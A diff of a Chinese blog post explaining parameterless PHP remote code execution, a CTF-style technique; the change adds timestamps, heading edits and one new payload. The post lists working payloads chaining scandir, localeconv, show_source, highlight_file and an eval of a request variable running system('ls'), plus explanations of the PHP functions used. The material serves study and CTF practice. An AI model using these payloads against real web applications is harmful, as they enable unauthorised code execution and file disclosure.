@@ -19,12 +19,12 @@
   <meta name="author" content="Colourful">
   <meta name="keywords" content="">
   
-    <meta name="description" content="常用payload show_source(array_rand(array_flip(scandir(current(localeconv()))))); highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(dirname(dirname(getcwd()))))))))); var_dump(get_define">
+    <meta name="description" content="常用payload show_source(array_rand(array_flip(scandir(current(localeconv()))))); highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(dirname(dirname(getcwd()))))))))); **var_dump(get_defi">
 <meta property="og:type" content="article">
 <meta property="og:title" content="无参RCE">
 <meta property="og:url" content="https://colourful228.github.io/2026/01/19/%E6%97%A0%E5%8F%82RCE/index.html">
 <meta property="og:site_name" content="Colourful">
-<meta property="og:description" content="常用payload show_source(array_rand(array_flip(scandir(current(localeconv()))))); highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(dirname(dirname(getcwd()))))))))); var_dump(get_define">
+<meta property="og:description" content="常用payload show_source(array_rand(array_flip(scandir(current(localeconv()))))); highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(dirname(dirname(getcwd()))))))))); **var_dump(get_defi">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://colourful228.github.io/2026/01/19/%E6%97%A0%E5%8F%82RCE/image-20260119000604195.png">
 <meta property="og:image" content="https://colourful228.github.io/2026/01/19/%E6%97%A0%E5%8F%82RCE/image-20260119000612764.png">
@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://colourful228.github.io/2026/01/19/%E6%97%A0%E5%8F%82RCE/1764091651550-e6616fa1-16b8-44ab-9737-44435195aa0d.png">
 <meta property="og:image" content="https://colourful228.github.io/2026/01/19/%E6%97%A0%E5%8F%82RCE/1764091943996-da1ea2ee-2e44-4ae4-b9ab-8f9520e80d7d.png">
 <meta property="article:published_time" content="2026-01-18T16:02:41.000Z">
-<meta property="article:modified_time" content="2026-02-11T14:19:50.816Z">
+<meta property="article:modified_time" content="2026-06-03T05:48:35.719Z">
 <meta property="article:author" content="Colourful">
 <meta property="article:tag" content="无参RCE">
 <meta name="twitter:card" content="summary_large_image">
@@ -427,7 +427,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2026-02-11T22:19:50+08:00
+                    本文最后更新于 2026-06-03T13:48:35+08:00
                   
                   
 
@@ -438,11 +438,14 @@
               <div class="markdown-body">
                 
                 <h1 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h1><ul>
-<li>show_source(array_rand(array_flip(scandir(current(localeconv())))));</li>
-<li>highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(dirname(dirname(getcwd())))))))));</li>
-<li>var_dump(get_defined_vars());：暴力输出所以变量</li>
+<li><strong>show_source(array_rand(array_flip(scandir(current(localeconv())))));</strong></li>
+<li><strong>highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(dirname(dirname(getcwd())))))))));</strong></li>
+<li>**var_dump(get_defined_vars());**：暴力输出所以变量</li>
 </ul>
 <p><code>chdir()</code>：这个函数会改变当前的工作目录到指定目录，这里将工作目录改变为根目录，并返回布尔值，如果没有这一步会发现不能读取根目录下的文件，只会报错  </p>
+<ul>
+<li><strong>eval(end(current(get_defined_vars())));&amp;a&#x3D;system(%27ls%27);</strong></li>
+</ul>
 <h1 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h1><p>可以获取当前目录的文件和子目录</p>
 <p>传入值：接收参数是要扫描的路径</p>
 <p>返回值：返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）</p>
@@ -505,40 +508,40 @@
 <p>end(scandir(current(localeconv())))</p>
 <p><img src="/2026/01/19/%E6%97%A0%E5%8F%82RCE/image-20260119000720229.png" srcset="/img/loading.gif" lazyload alt="image-20260119000720229"></p>
 <p><img src="/2026/01/19/%E6%97%A0%E5%8F%82RCE/image-20260119000726014.png" srcset="/img/loading.gif" lazyload alt="image-20260119000726014"></p>
-<h2 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h2><p>可以将数组的内部指针向前移动一位</p>
+<h1 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h1><p>可以将数组的内部指针向前移动一位</p>
 <p>传入值：要操作的数组</p>
 <p>返回值：返回移动后内部指针所指向的元素的值， 如果超出数组范围会返回false</p>
-<h2 id="prev"><a href="#prev" class="headerlink" title="prev()"></a>prev()</h2><p> 将数组的内部指针倒回一位  </p>
+<h1 id="prev"><a href="#prev" class="headerlink" title="prev()"></a>prev()</h1><p> 将数组的内部指针倒回一位  </p>
 <p>传入值：要操作的数组</p>
 <p>返回值：返回移动后内部指针所指向的元素的值， 如果超出数组范围会返回false</p>
-<h2 id="reset"><a href="#reset" class="headerlink" title="reset()"></a>reset()</h2><p> 将数组内部指针重置到第一个元素  </p>
+<h1 id="reset"><a href="#reset" class="headerlink" title="reset()"></a>reset()</h1><p> 将数组内部指针重置到第一个元素  </p>
 <p>传入值：要操作的数组</p>
 <p>返回值：返回重置后的内部指针指向的元素的值，即数组第一个元素的值</p>
-<h2 id="each"><a href="#each" class="headerlink" title="each()"></a>each()</h2><p> 可以获取当前数组内部指针指向的元素的键和值，并将指针向后移动一位  </p>
+<h1 id="each"><a href="#each" class="headerlink" title="each()"></a>each()</h1><p> 可以获取当前数组内部指针指向的元素的键和值，并将指针向后移动一位  </p>
 <p>传入值：要操作的数组</p>
 <p>返回值： 返回一个包含四个元素的数组，键0和key对应元素的键，键1和value对应元素的值。如果数组指针已经超出数组范围，返回false</p>
 <p>each(scandir(current(localeconv())))</p>
 <p><img src="/2026/01/19/%E6%97%A0%E5%8F%82RCE/1764091651550-e6616fa1-16b8-44ab-9737-44435195aa0d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h2 id="ord"><a href="#ord" class="headerlink" title="ord()"></a>ord()</h2><p> 获取字符串中第一个字符的ASCII码值  </p>
+<h1 id="ord"><a href="#ord" class="headerlink" title="ord()"></a>ord()</h1><p> 获取字符串中第一个字符的ASCII码值  </p>
 <p>传入值： 要处理的字符串  </p>
 <p>返回值： 字符串中第一个字符的ASCII码值  </p>
 <p>ord(end(scandir(current(localeconv()))))</p>
-<h2 id="chr"><a href="#chr" class="headerlink" title="chr()"></a>chr()</h2><p>和ord()函数功能相反，这个函数是将ASCll码值转化为字符</p>
+<h1 id="chr"><a href="#chr" class="headerlink" title="chr()"></a>chr()</h1><p>和ord()函数功能相反，这个函数是将ASCll码值转化为字符</p>
 <p>传入值：ASCll码值</p>
 <p>返回值：ASCll码值对应的字符</p>
-<h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p> 这个函数可以获取全部的 HTTP 请求头  </p>
+<h1 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h1><p> 这个函数可以获取全部的 HTTP 请求头  </p>
 <p>传入值：无需传入参数</p>
 <p>返回值： 会返回一个包含请求头的数组，键为请求头，值为请求头的值  </p>
 <p> 不过这个函数只能在 Apache 环境中使用，其他环境不能用  </p>
 <p><img src="/2026/01/19/%E6%97%A0%E5%8F%82RCE/1764091943996-da1ea2ee-2e44-4ae4-b9ab-8f9520e80d7d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p> 这个函数可以返回所有已定义变量的数组，包括全局变量、局部变量、超全局变量等  </p>
+<h1 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h1><p> 这个函数可以返回所有已定义变量的数组，包括全局变量、局部变量、超全局变量等  </p>
 <p>传入值：不需要传入参数</p>
 <p>返回值： 返回一个包含所有已定义变量的关联数组  </p>
 <p> 不过这个函数只能在 Apache 环境中使用，其他环境不能用  </p>
-<h2 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h2><p> 这个函数可以获取或设置当前会话的 Session ID  </p>
+<h1 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h1><p> 这个函数可以获取或设置当前会话的 Session ID  </p>
 <p>传入值：不需要传入参数</p>
 <p>返回值：返回当前会话的 ID，如果没有就会返回一个空字符串</p>
-<h2 id="读取文件内容函数"><a href="#读取文件内容函数" class="headerlink" title="读取文件内容函数"></a>读取文件内容函数</h2><p>highlight_file()</p>
+<h1 id="读取文件内容函数"><a href="#读取文件内容函数" class="headerlink" title="读取文件内容函数"></a>读取文件内容函数</h1><p>highlight_file()</p>
 <p>show_source()</p>
 <p>readfile()</p>
 <h2 id><a href="#" class="headerlink" title></a></h2>
@@ -612,7 +615,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年2月11日</div>
+          <div>2026年6月3日</div>
         </div>
       
       
